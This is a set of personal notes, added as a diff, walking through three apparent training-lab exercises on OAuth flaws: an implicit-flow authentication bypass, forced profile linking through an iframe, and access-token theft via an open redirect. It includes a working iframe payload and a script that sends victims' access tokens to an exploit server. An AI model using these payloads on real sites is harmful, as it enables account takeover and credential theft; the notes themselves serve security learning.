@@ -1,0 +1,72 @@
+Task 1:
+///Lab: Authentication bypass via OAuth implicit flow///
+
+Open the site in burp and log in with wiener/peter. Then go to burps http history and see watch happening while you log in.
+Notice this request: 
+POST /authenticate HTTP/2
+Host: 0a59004d04cee3168093034600600025.web-security-academy.net
+Cookie: session=YlLeiNcWlssfSOhib6ql3qoQqtVO6YiS
+...
+...
+Te: trailers
+
+{"email":"wiener@hotdog.com","username":"wiener","token":"muYlfEf0ccPtjmXjvz0l5HCccmnX5tYiEYY8ZU6KMLK"}
+
+This is the request which authenticating your account. Click on log out, turn on intercept, and click on my account. The site will log in automatically. Let the requests forward until you get the POST /authenticate
+request. Change the username, and email to carlos's credentials, and forward it. Turn off intercept and the lab is solved, we logged in as carlos.
+
+Task 2:
+///Lab: Forced OAuth profile linking///
+
+Open the site and log in with the simple credentials. After you loggen in you will se a "Attach a social profile" button. click on it and log in with the given credentials. Log out, and now you can log in with your
+social profile. The site will log you in automatically. Check this login procedure in burp. Yo got 2 GET requests one with /auth?client_id.... and one with /oauth-linking?code=...
+Notice that the first request sends the url with the authorization code for the second request. Maybe we can use this out.
+Log out. go to my account and turn on intercept. Click on login with social profile forward the requests until you get the /oauth-linking request. Click on the request with right mouse button and copy the url out,
+then drop the request. Go to exploit server, and create an iframe for this url:
+<iframe src="https://0ab600ab04b408da806c03fc00380083.web-security-academy.net/oauth-linking?code=N9wjjmEMKpPAPGUgrTTFv8vEDdd14-5zhxw2nohqWid"></iframe>
+Store it, deliver to the victim. Next time you log in with your social profile you will be admin, and you can delete carlos
+
+Task 3:
+///Lab: Stealing OAuth access tokens via an open redirect///
+
+Open the site and log in. After you logged in check the requests and notice that there is a GET /me request where the website makes an API call, then using tihs request to fetch the user info:
+{"sub":"wiener","apikey":"b4NVHTmVYrLqwprdBCDnPsOKVQieVrua","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}
+Send this request to repeater. Log out and then click on my account and you will log in automatically. If you look at this process there is a GET /auth?client_id=tfst74oqx1vv7f4237sst&redirect_uri=...request which
+is vulnerable to directory traversal. If you change the redirection url to https://0af000030304da9f808503d80078009d.web-security-academy.net/oauth-callback/../post?postId=1&response_type=token&nonce=-25633173&scope=openid%20profile%20email HTTP/2
+it will redirect you to the first post after logged you in. Auditin the post page at the end of the page you will see a next post which is redirecting to you to the next post. click on it and send the request to repeater.
+Modify the GET /post/next?path=/post?postId=2 to GET /post/next?path=abc.com and it will redirect you to abc.com. We will combine these vulnerabilites.
+Create this malicios url:
+https://oauth-0a6a001a03f4da1d804001cf02f200b8.oauth-server.net/auth?client_id=tfst74oqx1vv7f4237sst&redirect_uri=https://0af000030304da9f808503d80078009d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0100b703bfdab2803b028d01e5003b.exploit-server.net/exploit&response_type=token&nonce=-479258347&scope=openid%20profile%20email
+If you enter this in browser it will redirect you to your exploit servers hello world page.
+Now got to exploit server, and into body copy this:
+
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0a6a001a03f4da1d804001cf02f200b8.oauth-server.net/auth?client_id=tfst74oqx1vv7f4237sst&redirect_uri=https://0af000030304da9f808503d80078009d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0100b703bfdab2803b028d01e5003b.exploit-server.net/exploit&response_type=token&nonce=-479258347&scope=openid%20profile%20email
+'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+
+Store it, and deliver to the victim. Go to access log, and search a line like this:
+10.0.3.218      2026-04-08 11:23:52 +0000 "GET /?access_token=FRYcVnSR2AuxGNoGih9YXfXFjjlagSvbw19KHo3C5uA&expires_in=3600&token_type=Bearer&scope=ope..
+Copy out the access token, go to burps repeater and the GET /me request. Copy this access token into the requests Authorization header:
+GET /me HTTP/2
+Host: oauth-0a6a001a03f4da1d804001cf02f200b8.oauth-server.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://0af000030304da9f808503d80078009d.web-security-academy.net/
+Authorization: Bearer FRYcVnSR2AuxGNoGih9YXfXFjjlagSvbw19KHo3C5uA
+Content-Type: application/json
+Origin: https://0af000030304da9f808503d80078009d.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+Priority: u=4
+Te: trailers
+
+Send it, and you will get the administrators credentials:
+{"sub":"administrator","apikey":"tJQHS7ir7m4J1LcxmTLY95BP4vmNETx4","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
+Submit the api key, and you solved the lab.
